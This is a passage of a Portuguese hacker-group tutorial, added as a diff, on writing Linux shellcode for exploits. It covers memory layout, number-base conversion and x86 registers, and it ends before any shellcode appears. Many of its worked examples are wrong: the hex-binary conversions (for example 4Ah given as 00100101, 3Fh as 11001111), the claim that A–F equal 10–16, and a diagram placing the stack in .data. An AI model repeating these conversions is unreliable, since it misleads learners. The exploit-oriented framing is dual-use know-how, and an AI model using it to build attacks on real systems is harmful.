@@ -1,0 +1,3122 @@
+########################################################################
+######################## UNSEKURITY TEAM ###############################
+########################################################################
+
+http://unsekurity.virtualave.net/
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+Thanks Ramona,Magic Kiss e Unsekurity Team.
+nashleon@yahoo.com.br
+
+Aviso: Nao nos responsabilizamos pelo mau uso dos programas e dados aqui
+       fornecidos, bem como a utilizacao desse texto p/ fins maliciosos,
+       este texto possui somente propositos educacionais.
+
+
+                     ---------------------------------
+                    |   TUTORIAL BASICO DE ESCRITA    |
+                    |          DE SHELLCODES          |
+                     ---------------------------------
+                        
+
+------------------------------ INDICE -------------------------------
+1.INTRODUCAO
+2.MODELO USUAL DE MEMORIA
+  2.1 A Regiao do Stack(Pilha)
+3.TERMOS NECESSARIOS DO JARGAO
+4.CALCULOS ENVOLVENDO AS NOTACOES (hexa,decimal e binario)
+  4.1 Sistemas Decimal e Binario
+  4.2 Sistema Hexadecimal
+5.REGISTRADORES
+  5.1 Registradores Gerais
+  5.2 Registradores de Segmento
+  5.3 Registradores de Indexacao do Stack
+  5.4 Outros Registradores muito Usados
+6.LISTA DE COMANDOS
+  6.1 Instrucoes de Transferencia
+  6.2 Instrucoes Aritmeticas
+  6.3 Instrucoes de Comparacao
+  6.4 Instrucoes de Salto
+  6.5 Instrucoes Logicas
+7.SHELLCODES
+  7.1 Shellcode /bin/sh
+  7.2 Shellcode para setuid(0)
+  7.3 Shellcode para quebrar chroot()
+  7.4 Dividas para o proximo tutorial
+8.TERMINANDO
+  8.1 Diferencas entre a sintaxe INTEL & AT&T
+  8.2 Links e Referencias
+  8.3 Consideracoes Finais
+----------------------------------------------------------------------
+
+
+-------------
+1. INTRODUCAO|
+-------------
+
+Bem amigo, estou de novo aqui, tentando disponibilizar alguma coisa
+relacionada ao mundo dos fucadores(fussadores).A recepcao ao txt anterior
+foi muito boa, e os creditos se devem a uniao que vem sendo apresentada
+pelo grupo "Unsekurity Team", entao soh cabe a mim, dar continuidade aos
+trabalhos, sendo que em breve estaremos disponibilizando projetos
+desenvolvidos por nos mesmos, visando um maior intercambio entre os
+membros e a comunidade que mexe com "inseguranca" de um modo geral.
+Esse tutorial nao tem o intuito de se aprofundar neste assunto,
+somente dar o ponta-peh inicial, virao outros tutoriais em breve,
+visando mais aprofundamento e aperfeicoamento desta materia(Escrita de
+shellcodes).A questao do tempo, nosso inimigo, tem sido levada em conta,
+por isso devemos ir com calma.Logo em breve, estaremos avancando juntos,
+na divulgacao de Teorias e Praticas mais abrangentes, e divulgando mais
+materiais interessantes no que diz respeito a conhecimentos na area de
+programacao voltada a fucadores.O intuito nao eh, nem jamais serah dar
+receitinhas de bolo, ou mesmo, disponibilizar lixo. Tendo em vista um
+publico alvo de Newbies, digo isso nao por menosprezo, como tem gente
+falando por aih, pois antes de tudo eu tambem sou um Newbie, vivo
+pesquisando e buscando informacoes.Voce deve estar se perguntando, mas
+newbie sao novatos, begginers, sem experiencia!!!Quem disse que eu nao
+sou isso??:)...Hoje em dia eh preferivel mil vezes ser conhecido e
+chamado de "lamer" do que qualquer outra coisa. Tendo em vista que a
+midia diz que "hackers" destruiram isso e aquilo, que mudaram essa ou
+aquela home page!!Prefiro ser comparado com lamer do que com isso!!
+Mas, bola para frente,iremos escrever shellcodes baseados em assembly,
+Como o escritor desse texto nunca pisou numa faculdade de computacao
+ou num curso de programacao,nao se pode esperar muito dele nesse quesito,
+por isso irmao,rale!!pense! corra atras!!Sabemos que fucadores sao
+praticos, isso os coloca numa classe onde de um lado,os programadores
+experientes que mexem com softs complexos dizem:
+"eles nao sabem programar"  e do outro profissionais da seguranca
+que dizem: "Eles sao bons programadores", e voce no meio disso
+tudo sem saber se sabe das coisas ou nao.Vai minha opiniao,fucadores sao
+praticos!!programam o essencial p/ se obter um determinado objetivo!!
+Desse modo a seguranca e os programadores experientes estao certo,
+fucadores nao mexem com metodos complexos de algoritmos, mas alcancam
+com o que sabem o alvo que estipularam.Sendo um bom ou mau programador
+voce pode sim um dia ser um otimo fucador.Tem gente que diz que eh
+dificil escrever um exploit!!Acho que a maioria sabe que a coisa varia,
+mas fazer a carcaca, e entender o por que da carcaca, creio que todos
+que leram a phrack 49 jah sabem!!:)
+
+Vamos deixar de conversa fiada e vamos caminhando.Os exemplos akih
+serao feitos todos em plataforma linux, usando o compilador gcc mesmo.
+Lembrando que esse texto eh voltado p/ shellcodes em c.Usaremos o
+debugador gdb da gnu que vem na maioria dos linuxes descentes.
+A sintaxe  serah a AT&T(para unix),sendo que terah no final uma
+breve explicacao  sobre ela,p/ usuarios de sistemas INTEL(dos) verem como
+funciona a coisa. Vamos partir do inicio que voce jah leu ou sabe alguma
+coisa de assembly,que conhece o porque de se usar essa linguagem, e essas
+coisas toda de se programar com assembly,porque se pode fazer isso e aquilo.
+Os exemplos praticos aqui descrito sao simples,mas a medida que a coisa
+for ficando cada vez mais dificil, iremos recapitular,de modo que antes
+de comecarmos eu jah aviso: Paciencia!!Tenha muita Paciencia!! Estaremos
+trabalhando com baixo nivel, soh quem conhece sabe o poder que essa
+linguagem possui.Pense que, os melhores virus,os melhores exploits,
+os melhores shellcodes,os melhores ??????? foram feitos em assembly
+por pessoas que um dia sabiam menos do que voce amigo.Como eu nao
+pretendo ir fundo em assembly, cabe a voce pesquisar mais sobre essa
+linguagem, caso necessite mesmo.Outro pre-requisito eh saber programar
+em C, hoje em dia o fucador necessita ir fundo nessa linguagem.
+Bom, daremos inicio logo a esta jornada.Boa Sorte Fera!!!
+
+---------------------------
+2. MODELO USUAL DE MEMORIA |
+---------------------------
+
+O modelo usual de memoria difere de sistema para sistema.Em Linux/i386
+ela possui modelo flat de 32 bit.Um programa pode ser dividido em
+secoes.As secoes sao .text para seu codigo, .data para seus dados, .bss
+para dados indefinidos.Os programas devem ter no minimo a secao .text.
+Um esquema para visualizacao disso seria:
+
+
+                        -------------------
+                       |       .DATA       |
+                       |      (Stack)      |
+                        -------------------
+                       |       .BSS        |
+                       |      (Heap)       |
+                        -------------------
+                       |       .TEXT       |
+                        -------------------
+
+
+Como vimos acima, eu coloquei as respectivas regioes onde ocorrem oveflows
+relacionados.Stack overflows ocorrem na regiao .data, heap tambem pode
+ser usado p/ sobrescrever essa regiao (.data), mas eh usualmente mais
+usado p/ sobrescrever a regiao .bss.Num outro txt, veremos como fazer
+overflows, mas por enquanto, se atenha soh ao shellcode(codigo que se
+executa via exploits) que se localizarao na regiao Stack.
+
+
+2.1 - A REGIAO DO STACK (PILHA)
+---------------------------------
+
+A regiao conhecida como STACK ou pilha, eh responsavel por receber
+dados(argumentos) e passa-los p/ as funcoes.Essa regiao possui tamanho
+relativo(muda quase sempre).O nome que se dah a essa regiao(STACK) eh
+porque ela pode ser comparada a uma pilha, onde voce vai enchendo ela
+de dados, soh que ela possui uma particularidade.Essa particularidade
+consiste em: O ultimo dado a entrar serah o primeiro a sair, chamamos
+isso de LIFO - last in, first out (ultimo a entrar,primeiro a sair).
+Na medida em que eh usado, o Stack ou a pilha,chamarei de Stack, cresce
+p/ baixo, sendo assim, a quantidade de memoria necessaria eh determinada
+pela maneira como o programa foi projetado.Por exemplo, um programa com
+muitas funcoes recursivas utiliza mais memoria  no Stack do que um
+programa sem funcoes recursivas, justamente porque variaveis locais
+sao armazenadas no Stack.A parte necessaria para o programa e as
+variaveis globais, eh determinada durante a execucao do programa.
+Uma pilha(Stack) eh o contrario de uma fila,porque usa o acesso "ultimo
+a entrar, primeiro a sair", denominado LIFO.Para visualizar um Stack,
+basta imaginar uma pilha de pratos.O prato da base do Stack eh o ultimo
+a ser usado e o prato do topo, o primeiro.Stacks sao geralmente utilizados
+em softwares basicos, incluindo compiladores e interpretadores.Geralmente
+o C usa o Stack quando passa parametros(argumentos) as funcoes.Dois
+comandos em assembly sao usado para enviar e retirar dados do Stack,
+sao eles push e pop, respectivamente.
+
+Veremos abaixo o esquema de um Stack em acao:
+         Acao                   Conteudo do Stack
+        ------                ---------------------
+
+       push(A)                          A
+       push(B)                          A  B
+       push(C)                          A  B  C
+       pop()  /* retira o ultimo */     A  B
+       push(N)                          A  B  N
+       pop()                            A  B
+       pop()                            A
+       pop()                            /* vazio */
+
+
+
+Vemos acima o esquema da LIFO - ultimo a entrar,primeiro a sair.
+Isso eh mais do que o suficiente, espero que tenha ficado claro as coisas
+para voce,amigo!!
+
+--------------------------------
+3. TERMOS NECESSARIOS NO JARGAO |
+--------------------------------
+
+Se voce manja de assembly, JMP 7.Se nao, entao isto eh util para voce.
+
+Iniciaremos aprendendo um pouco sobre alguns termos no jargao da
+informatica que serao muito uteis para nosso aprendizado,comecaremos
+do mais simples:
+
+1 BIT:          |0|
+
+Simplesmente o menor dado que existe.O computador entende em duas
+condicoes um 1 ou um 0.
+Exemplo: |00000001| = 1 ; |00000010| = 2;
+
+1 NIBBLE:       |0000|
+
+1 NIBBLE equivale a 4 BITs, e eh metade de um BYTE.Se voce notar, verah
+que ele possui um valor maximo de 15(|1111|). Numeros em hexadecimais
+sao baseados no NIBBLE, possuem tambem um valor maximo de 15, que eh
+representado pela letra F.Os digitos em HEXADECIMAL seguem a seguinte
+ordem:
+
+"0123456789ABCDEF"
+
+A notacao padrao para numeros em HEXADECIMAL eh zero seguido pelo numero
+em hexadecimal, seguido pela letra "h" indicando que estah em hexa.
+Exemplo: "0FFh" = 255 em decimal.
+
+Como vamos mecher com compilador C, geralmente usaremos a notacao
+seguinte: Um zero seguido de um x e em seguida o numero em hexadecimal.
+0xff = 255 em decimal.
+
+Um exemplo pratico para vermos isso usando C, seria:
+
+#include <stdio.h>
+main(){
+printf("O numero 255 em hexadecimal eh 0x%x \n",255);
+}
+
+
+Como podemos ver esse 0x antes do numero propriamente dito em hexa eh
+somente por padronizacao, e adotaremos ele no decorrer desse tutorial.
+Veremos agora algumas coisas sobre BYTE.
+
+1 BYTE:         |00000000|
+2 NIBBLES          %al
+8 BITS
+
+Como podemos ver, 1 BYTE eh diferente de 1 BIT,muita gente costuma
+confundir isto.Um BYTE possui um valor maximo de 0xFF ( = 255 em decimal).
+Um BYTE equivale a 2 NIBBLES, entao sua representacao hexadecimal eh
+simplesmente dois digitos hexa em uma fila.
+Exemplo: 0x14, 0x20, 0xAE, 0xff, etc.
+Esse "%al" descrito acima, representa um tipo de registrador de tamanho
+de 1 BYTE, no caso, esse registrador eh o Acumulador Low(Acumulador
+Baixo).Estamos desde jah usando a sintaxe AT&T, se voce estah acostumado
+com a sintaxe INTEL, leia mais abaixo as diferencas.Mais lah na frente
+voce verah  o que significa esse "al".
+Veremos agora outro termo muito conhecido do jargao, a WORD, alguns
+preferem traduzir por PALAVRA, mas ficarei com a forma original, como
+poucos traduzem NIBBLE, nao traduzirei nenhum desses termos p/ que voce
+possa jah ir se acostumando com eles na forma original.
+
+1 WORD:         |0000000000000000|
+2 BYTEs           %ah     %al
+4 NIBBLEs             %ax
+16 BITs
+
+Vemos que nesse termo tambem nao ha muito segredo, 1 WORD (%ax)
+equivale a 2 BYTEs (%ah + %al), 4 NIBBLES, logo eh representado com
+4 digitos em hexadecimal. Este eh o tamanho dos registradores de 16 bits
+em sistemas 80x86.Veremos agora um DWORD ou dupla WORD.
+
+1 DWORD:
+2 WORDs:        |00000000000000000000000000000000|
+4 BYTEs:                            %ah     %al
+8 NIBBLES:                              %ax
+32 BITs:                        %eax
+
+Uma DWORD equivale a 2 WORDs, tambem possui o nome DOUBLE-WORD.Possui um
+valor maximo de 0xFFFFFFFF, 8 NIBBLES("F"), que equivale a 4,294,967,295
+em decimal.Pequeno hein!!
+Como vimos, linux eh 32bits, usaremos muito essa notacao de 32 bits que
+serah explicada mais abaixo.Mas saiba que o "e" antes do registrador( ex:
+%eax) indica que  o registrador eh  extendido.
+
+
+------------------------------------------------------------
+4. CALCULOS ENVOLVENDO AS NOTACOES (hexa, decimal e binaria) |
+------------------------------------------------------------
+
+Ja sabemos o que sao numeros binarios, numeros em hexadecimal e o sistema
+comum da humanidade que eh os numeros em decimal.A conversao entre numeros
+varia muito, use um pouco da matematica da melhor forma possivel, caso
+jah saiba isso tudo, nao hesite em pular para o proximo topico, caso nao
+saiba, darei um breve explicacao sobre os metodos de conversao simples.
+
+4.1 Sistemas Decimal e Binario.
+-----------------------------------
+
+Para nao termos duvidas quanto a conversao entre sistemas, faz-se
+necessario uma breve explicacao desses dois sistemas acima.
+O nosso sistema comum de calculos, o decimal, possui uma base 10, a razao
+disso eh que nos primordios das civilizacoes, o homem iniciou suas contas
+com a ajuda dos dedos das maos, como temos dez, convencionou-se fazermos
+nossos calculos usando como referencia 10 possiveis numeros.As maquinas
+nao possuem maos..:).. elas interpretam apenas dois estados (ligado e
+desligado), entao a notacao binaria, 1 ou 0, tornou-se habil p/ se
+usar em computadores.Nao possuo muito conhecimento nessa parte de hardware,
+ouvi comentarios que existem sistemas trinarios, mas nunca lih nada a
+respeito, fica aih uma pergunta, existe mesmo isso? De qualquer forma
+isso nao se aplicarah aos nossos estudos, lembre-se,fucadores sao praticos!
+Para fazermos conversao entre esses sistemas, nos utilizamos dos seguinte
+artificios:
+
+* De Binario para Decimal:
+--------------------------
+
++ Pegamos o numero binario que queremos conveter colocando-o ao contrario,
+de tras p/ frente(da direita p/ a esquerda), em seguida dividimos ele em
+partes(casas), deixando cada digito binario(1 ou 0) sozinho.Depois nos
+multiplicamos cada digito por 2 elevado a casa decimal correspondente
+dele - 1.Vejamos um exemplo com o numero 10011.
+
+- Primeiro nos invertemos ele, fazendo-o ficar da seguinte forma:
+
+10011(antes) - invertemos fica - 11001(depois).
+
+Preste atencao, o que fizemos foi fazer o ultimo digito se tornar o
+primeiro, e assim sucessivamente.
+
+Feito isso seguimos multiplicando cada digito por 2 elevado a casa
+correspondente menos 1.Vejamos:
+
+binario:         1        1       0       0       1
+decimal:       1*2^0    1*2^1   0*2^2   0*2^3   1*2^4
+      =          1    +   2   +   0   +   0   +   16   = 19.
+
+O caracter " ^ " indica que o numero eh uma potencia, seria 1 que
+multiplica 2 elevado a 0 no primeiro caso. Nao ha segredo, multiplica-se
+o numero binario(1 ou 0) por 2 elevado a casa decimal dele menos 1.
+
+Vejamos mais um exemplo:
+Pegamos o numero binario 1010b e facamos a conversao:
+
+- Primeiro nos invertemos o numero binario:
+
+1010(antes) -> Inverte-o -> 0101(depois)
+
+- Em seguida multiplicamos cada digito por 2 elevado a casa dele menos 1.
+    0       1       0      1
+  0*2^0 + 1*2^1 + 0*2^2 + 1*2^3 =
+    0   +   2   +   0   +  8    = 10
+
+Podemos ver perfeitamente que nao eh nada dificil, espero que tenha
+entendido.Caso se faca necessario,haja duvidas, consulte outros textos
+sobre isso nas home pages que divulgo no final desse arquivo texto.
+
+
+* De Decimal para binario:
+--------------------------
+
+Existem varios metodos p/ converter Decimal para Binario.Iremos demostrar
+aqui, o metodo mais facil e conhecido.Vejamos um exemplo com o numero 56:
+
+56/2 = 28 (nao possui resto entao eh = 0);
+28/2 = 14 (nao possui resto entao eh = 0);
+14/2 = 7  (nao possui resto entao eh = 0);
+7/2  = 3  (possui resto entao eh = 1);
+3/2  = 1  (possui resto entao eh = 1);
+1/2 = 0   (possui resto entao eh = 1);
+
+Iremos entao construir o numero do ultimo a ser calculado ateh o
+primeiro ( de baixo para cima).Seria entao: 111000
+
+Eis aih nosso esquema p/ converter de decimal para  binario: Pegamos o
+numero e dividimos ele e seus restos por dois (fatoramos), admitindo
+sempre que o resultado eh um numero inteiro, quando houver resto, entao
+o correspondente eh o numero binario 1, quando nao houver o correspondente
+eh o numero binario 0, depois pegamos os binarios de baixo para cima
+para formarmos o numero completo correspondente ao numero decimal desejado.
+
+4.2 Sistema Hexadecimal
+-----------------------
+O sistema hexadecimal como foi mostrado acima possui uma base de 16 digitos.
+Sao eles os numeros de 0 a 9 e as letras de A a F do nosso alfabeto que
+correspondem a 10,11,12,13,14,15,16 , respectivamente.Entao a notacao
+hexadecimal consiste da seguinte sequencia: 0123456789ABCDEF.
+Veremos agora as conversoes entre esses sistemas:
+
+* De Binario para Hexadecimal
+------------------------------
+A primeira coisa que devemos fazer eh dividir o numero binario em grupos
+de 4 bits, iniciando da direita para a esquerda.No caso do ultimo grupo,
+caso o numero binarios nao possua casas de multiplos de quatro,dividimos
+igualmente, e enchemos o resto da estrutura(numero binario p/ ficar como
+multiplo de quatro) com zeros(0).Vejamos um exemplo com o numero binario
+101011 :
+
+10:1011   -> Dividimos ele em grupo de 4,mas faltam casas entao
+1000:1011 -> Enchemos ele com zeros p/ que fique com grupos de 4 completo.
+             Lembre-se, coloque os zeros a esquerda.
+
+Agora pegamos cada grupo como um numero independente e consideramos o seu
+valor em decimal. ex:
+1000 = 1 em Decimal. (1*2^0 + 0*2^1 + 0*2^3 + 0*2^4 = 1)
+1011 = 11 em Decimal.(1*2^0 + 0*2^1 + 1*2^2 + 1*2^3 = 11)
+
+0010 = 1 ; 1011 = 11.
+
+Juntamos entao os resultados obtidos em cada grupo:
+111
+
+Como 111 daria erro, temos que transformar os numeros maiores que 9 para
+suas respectivas letras.11 possui a letra B.Entao nosso numero ficaria
+1Bh ( onde h serve para indicar que o numero eh hexadecimal ).
+
+* De Hexadecimal para Binario:
+------------------------------
+Tambem nao possui misterio, fazemos o processo inverso do descrito acima.
+Vejamos para o numero 3Fh.
+3F eh a uniao de 3 com F(15);
+nosso numero seria 3 no primeiro grupo e 15 no segundo.
+Passando de decimal para binario,teriamos:
+3/2 = 1 (possui resto entao eh = 1);
+1/2 = 0 (possui resto entao eh = 1);
+
+o numero 3 em binario eh igual a 11.
+
+15/2 = 7 (Possui resto entao eh = 1);
+7/2  = 3 (Possui resto entao eh = 1);
+3/2  = 1 (Possui resto entao eh = 1);
+1/2  = 0 (Possui resto entao eh = 1);
+
+
+o numero 16 em binario eh 1111.
+
+Unindo as estruturas da direita para a esquerda,teremos:
+
+1100;1111
+
+Logo nosso numero seria 11001111.
+
+Existe um tutorial em portugues, que deve estar entre os links que
+divulgo no final que se enrola nisso em cima, tem que estar atento,
+ele troca, enche as casa de que nao sao multiplas de 4 de forma errada,
+por isso amigo, fique atento e busque mais material sobre isso, caso
+tenha duvidas, e como isso eh matematica, ou eh certo ou errado, nao
+tem meio termo, pesquise!Mas para que meus leitores nao possuam duvidas,
+eu escrevo para Newbies, aih vai mais um exemplo, compare com o anterior
+e verah que existe exatidao nos calculos.
+Mostraremos a conversao do numero 4A em hexa para binario:
+
+Primeiro dividimos ele em partes:
+
+   4    |    A
+   4    |    11
+
+Depois Fazemos sucessivas divisoes em cada um, sempre observando
+o resto obetido, se o resto for igual a um inteiro perfeito,
+o binario correspondente eh zero, senao o binario correspondente eh um:
+
+4/2 = 2  -> O resto eh um inteiro, logo binario correspondente = 0.
+2/2 = 1  -> O resto eh um inteiro, logo binario correspondente = 0.
+1/2 = 0,5 -> O resto nao eh um inteiro perfeito, lgo binario   = 1.
+
+Unindo os resultados num grupo de quatro, teremos:
+
+0010; Onde esse ultimo zero eh acrescentado para completarmos o grupo.
+
+Agora para A que equivale a 10 em decimal.
+
+10/2 = 5 -> O resto eh um inteiro, logo binario correspondente = 0.
+5/2  = 2,5 -> O resto nao eh um inteiro, pegamos o 2,5 e arredondamos
+              para 2, e jah que o resto nao eh um inteiro, entao o
+              binario correspondente eh igual a 1.
+2/2 = 1 ->   Resto inteiro, binario = 0.
+1/2 = 0.5 -> Aqui nos paramos, numero nao eh inteiro, binario = 1.
+
+Pegando os binarios correspondente, teremos:
+
+0101; Como vimos jah eh um grupo de 4.
+
+Unimos os dois grupos de 4 e obteremos o resultado final:
+
+0010;0101
+00100101
+
+Nosso numero hexadecimal 4A em binario eh igual a 00100101.
+
+
+* De Decimal para Hexadecimal
+------------------------------
+
+Isso eh bastante simples.Sabemos que pela notacao, faz-se necessario dessa
+forma, substituirmos um numero maior que 9 e menor que 15 pela respectiva
+letra correspondente(A ateh F).Levando-se em conta isso, fazemos o
+seguinte esquema para conversao de um numero decimal para hexadecimal:
+
++ Dividimos ele por 16. Pegamos seu resto.
++ Dividimos o quociente da divisao acima e dividimos por 16.Pegamos o
+  resto.
++ O mesmo esquema anterior sucessivamente, ateh que o numero obtido no
+  quociente da divisao anterior seja menor que 16, aih ele proprio serah
+  considerado como sendo o resto.
+
+
+Vejamos um exemplo:
+Usaremos o numero 2000 como exemplo.
+
+Dividimos ele por 16 e seus sucessivos quocientes tambem por 16.Ex:
+
+2000 / 16 = 125 (Quociente = 125; Resto = 0);
+
+125 /16 = 7     (Quociente = 7; Resto = 13);
+
+7 / 16 =>       (Aqui 7 eh menor 16 entao fica sendo resto = 7)
+
+Podemos notar que temos 3 numeros, pegamos os restos obtidos de
+baixo(ultimo) para cima(primeiro) e unimos num soh numero, assim:
+
+7 - 13 - 0  => 7 - D - 0 => 7D0
+
+Eis aih o nosso numero 7D0.Lembrando que pela notacao, 13 eh igual a D.
+
+Irei demonstrar outro numero como exemplo, para que nao hajam duvidas:
+Vejamos o numero 1980 (Considerada a decada de ouro do hacking mundial).
+
+Comecamos dividindo ele por 16;
+
+1980 / 16 = 123 (Quociente = 123; Resto = 12);
+123 / 16  = 7   (Quociente =   7; Resto = 11);
+7  /  16  => 7  (Como divisor < 16 entao fica ele como Resto = 7);
+
+Pegando de baixo(ultima divisao) p/ cima(primeira divisao), teremos:
+
+7 - 11 - 12  => 7 - B - C  => 7BC.
+
+Bem, aih estah amigo.Veremos agora outro tipo de conversao:
+
+
+* De Hexadecimal para Decimal:
+------------------------------
+
+De Hexadecimal para Decimal eh bem simples.Caso nao tenha entendido os
+calculos acima, talvez isto sirva para clarear um pouco.O processo para
+se obter um numero Decimal a partir de um Hexadecimal eh exatemente o
+metodo oposto ao demostrado acima.Vejamos;
+
++ Pegamos um numero hexa, dividimos ele em partes ou casas decimais e
+  multiplicamos ele pelo numero (16 ^ X), onde X representa a casa decimal
+  ocupada pelo respectivo numero - 1.Em seguida somamos os resultados
+  obtidos com cada multiplicacao.
+
+Vejamos um exemplo com o numero 7BC citado acima.
+
+Para facilitar, separamos ele em casas;
+
+7 - B - C => 7 - 11 - 12;
+
+Pegamos cada casa e multiplicamos por 16 elevado a casa - 1 (16 ^ X).
+
+7  * 16 ^ 2 = 1792
+11 * 16 ^ 1 =  176
+12 * 16 ^ 0 =   12       Somando os respectivos resultados,teremos:
+              -----
+               1980
+
+Como visto, nao eh nem um pouco complicado, mas demonstrarei outro
+exemplo usando o numero hexadecimal 5F1.
+
+Dividindo ele em partes, teremos:
+
+5 - F - 1  => 5 - 15 - 1
+
+Pegando cada casa e multiplicando por 16 elevado a casa - 1 (da direita
+para a esquerda).Teremos:
+
+5  * 16 ^ 2 = 1280
+15 * 16 ^ 1 =  240
+1  * 16 ^ 1 =    1
+
+Somando os resultados obtidos, teremos:
+
+1280 + 240 + 1  = 1521.
+
+
+Eh isso aih amigo, nao vou ensinar operacoes envolvendo numeros desses
+sistemas numericos, nao creio que usarei aqui neste tutorial, mas eh
+bom saber disso tudo, veja outros txts, isso eh importante no mundo
+da programacao de baixo nivel, nao use programas que jah dao o
+resultado instantaneo, sem saber o processo mano!!Essas calculadoras
+tem servido muito para alienar o pessoal, fazendo com que mais pessoas
+fiquem dependentes das maquinas, para efetuarem os calculos.Eu sei
+que o pessoal que meche com baixo nivel, eh porque gosta de programar,
+nada contra quem usa alto nivel, mas com alto nivel as coisas sao
+muito limitadas, muito mesmo, ainda mais para nossos intuitos.Entao
+amigo, se quer ser um fucador de verdade, nao digo para deixar de vez
+as linguagens de alto nivel, mas aprenda as de nivel baixo.C pode ser
+considerada de alto,medio e baixo, eh uma linguagem fascinante, quem
+aprende, nao quer largar mais, a mesma coisa se diz de assembly, soh
+que assembly eh fogo!!!:)..Analise seu caso, decida seu rumo,amigo,
+ve aih o que vai ser mais util para voce no futuro!
+
+
+------------------
+5 - REGISTRADORES |
+------------------
+
+Voce deve estar lendo e pensando que irei ensinar voce a programar em asm.
+Jah disse, amigo, volto a repetir, este eh um tutorial sobre escrita de
+shellcodes, necessita saber o basico de assembly.Descreverei aqui dados
+relacionados a essa linguagem que ajudarao a clarear as coisas, mas se quer
+ir longe, procure bons textos ou livros sobre isso, disponibilizarei urls
+no fim desse texto, mas elas por sih soh ainda nao sao tudo sobre asm.
+Pesquise, vah fundo, nao desista!
+Essa parte irah descrever brevemente o que sao alguns dos registradores
+em asm, para que servem e como usa-los.Vamos lah!
+
+Registradores sao uma especie de instrucoes que recebem e guardam
+variaveis.Eles sao muito comuns no recebimento de dados p/ enviarmos depois
+a algum lugar da memoria(Stack por exemplo).
+
+Veremos abaixo, uma breve explicacao sobre cada um desses registradores:
+
+5.1 Registradores Gerais
+-------------------------
+
++ AX  -> Eh um registrador de 16 bits.Pode-se acessar parte dele.Como ele
+         eh 16 bits, podemos acessar se quisermos apenas 8 bits, para isso
+         devemos declara ele como sendo AH ou AL.AX eh conhecido como
+         Acumulador X.Sabemos que X pode ser substituido por L(low) ou
+         H(high), traduzindo, alto e baixo, respectivamente.Qualquer
+         mudanca para AL ou AH implicarah numa mudanca de AX.
+         Esse registrador eh muito usado em operacoes de entrada e saida
+         de dados.Num sistema i386, que eh o que usaremos, ao inves de
+         simplesmente AX, usaremos EAX, e como registradores recebem o
+         simbolo de porcentagem(%), nosso registrador ficarah %EAX.
+         Tenha em mente por enquanto que ele eh um registrador que
+         acumula dados.Um exemplo seria ele receber o endereco de uma
+         determinada instrucao ou string e empurra-la sobre o Stack.
+         Isso pode ser visto abaixo:
+        
+         mov    0xfffffff8(%ebp),%eax
+         push   %eax
+
+         No exemplo acima %eax recebe o endereco de uma string
+         0xfffffff8(%ebp) e depois eh empurrado os dados de %eax sobre
+         o Stack.Lembrando que estamos usando a sintaxe AT&T onde a
+         fonte(origem) vem primeiro e o destino depois.
+         Aos poucos a coisa vai clarear mano, paciencia!
+
++ BX -> Conhecido como registrador BASE.Possui o mesmo esquema de AX, onde
+        voce pode colocar dados nas partes dele,BH (alta) e BL(baixa).Na
+        sintaxe AT&T para i386 teriamos ele como sendo %EBX.Ele eh muito
+        usado como um registrador de offset.Um exemplo do uso dele seria:
+
+        movl %esi,%ebx
+
+        Onde copiamos o endereco dos dados de %esi para este registrador.
+
++ CX -> Esse eh conhecido como o registrador contador(count).Tambem como
+        AX e BX, ele pode ser dividido e manipulado em partes,CH(Counter
+        high), para manipularmos na parte alta(8 bits para cima) e
+        CL(Counter low), para manipularmos na parte baixa(8 bits p/ baixo).
+        O que devemos ter em mente eh o uso disso nas nossas implementacoes.
+        Geralmente usaremos CX e deixaremos o programa fazer o servico por
+        nos.NA sintaxe AT&T teremos entao p/ CX o seguinte formato: %ecx.
+        Esse registrador eh muito usado em situacoes de loop, e contagem
+        em desvios condicionais.
+        Um exemplo dele seria:
+
+        movl $10, %ecx
+
++ DX -> Eh o registrador de dados.Assim como os acima, ele eh usado para
+        salvar dados(receber).Ele tambem pode ser divido em partes,
+        DH(Data High), para manipularmos na parte alta, e DL(Data Low),
+        como voce jah deve saber, p/ manipularmos na parte baixa da
+        memoria.Ele eh muito usado em operacoes aritmeticas, como MUL,
+        DIV e etc.. Um exemplo para ele seria:
+
+        leal 0xc(%esi),%edx
+
+        Onde %edx acima carregado com o valor de 0xc + o valor de %esi.
+
+
+5.2 - Registradores de Segmento:
+---------------------------------
+        
++ ES -> Segmento Extra(Extra Segment).Ele eh usado como o segmento
+        destino em operacoes de tranferencia e movimentacao de dados,
+        como mov.
+
++ DS -> Segmento de Dados(Data Segment).Representa a area na memoria
+        onde os dados sao armazenados.Todos os dados lidos pela CPU
+        sao do segmento apontado para este registrador.Ele eh usado
+        como segmento(endereco) origem para operacoes com mov,lods.
+
+5.3 - Registradores de Indexacao do Stack:
+------------------------------------------
+
+Estes interessam e muito aquele que querem entender o processo preludio
+ou inicial de programas C (necessario para se entender os Stack Overflows).
+De qualquer forma, sao eles:
+
++ BP -> Apontador de Base(Base Pointer).Eh usado para acessar o Stack.
+
++ SP -> Apontador do Stack(Stack Pointer).Ele aponta para a posicao de
+        memoria atual do Stack.
+
+Esses dois registradores se complementam em processos de envio de codigos
+sobre o Stack.Na parte de programacao de shellcodes propriamente dita,
+voce verah com mais clareza isto que estou dizendo.
+
++ SS -> Segmento de Pilha(Stack Segment).Eh usado pela CPU para armazenar
+        enderecos de retorno de sub-rotinas.Eh o segmento onde reside o
+        Stack.
+
+5.4 - Outros Registradores Muito Usados
+----------------------------------------
+
+Esses registradores que seguem abaixo, sao tambem de grande importancia,
+descreverei rapidamente o que representa cada um.
+
+
++ CS -> Segmento de Codigo(Code Segment).Refere-se a parte da memoria
+        (bloco) onde os codigos sao armazenados.Este segmento aponta
+        para a proxima instrucao,nao pode ser mudado diretamente.
+
++ SI -> Indice Fonte, ou Indice Origem(Source Index).Muito usado para
+        movimentacao de blocos de instrucoes, voce verah isso muito
+        nos nossos shelcodes.Ele aponta para a proxima instrucao.Um
+        exemplo deste dito cujo segue abaixo:
+
+        movl $0x0, 0xc(%esi)
+
+        Onde %esi eh um bloco de instrucoes jah pre-definidas.
+
++ DI -> Indice Destino(Index Destination).Ele pode ser usado como um
+        registrador de offsets.Muito usado em operacoes com movs e stos.
+
+
+Bem amigo, esses sao os mais usados e conhecidos, tem ainda outros
+registradores como FS, GS, mas que nao descreverei neste tutorial, pois
+fogem do nosso objetivo.
+
+
+
+-----------------------------
+6 - LISTA BASICA DE COMANDOS |
+-----------------------------
+
+Nesse capitulo, descreverei de forma breve e rapida, uma lista basica
+e necessaria de comandos assembly que nos ajudarao a construir nossos
+shellcodes. Lembrando que trabalharemos em cima de um codigo C
+que serah sempre feito anteriormente.Os comandos em assembly variam muito.
+O que eu chamo aqui de comandos, sao intrucoes em assembly responsaveis
